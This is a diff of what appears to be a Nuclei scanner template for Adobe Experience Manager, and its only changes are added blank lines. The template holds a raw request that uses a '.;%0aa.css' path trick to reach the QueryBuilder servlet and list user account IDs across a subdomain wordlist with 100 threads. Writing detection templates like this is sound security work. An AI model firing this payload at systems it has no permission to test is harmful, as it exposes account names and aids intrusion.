@@ -1,14 +1,17 @@
 id: aem-jcr-querybuilder
+
 info:
   author: DhiyaneshDk
   name: Query JCR role via QueryBuilder Servlet
   severity: info
   tags: aem
+
 requests:
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
     attack: sniper
     threads: 100
+
     raw:
       - |
         GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
@@ -25,6 +28,7 @@ requests:
       - type: status
         status:
           - 200
+
       - type: word
         words:
           - '"success":true'
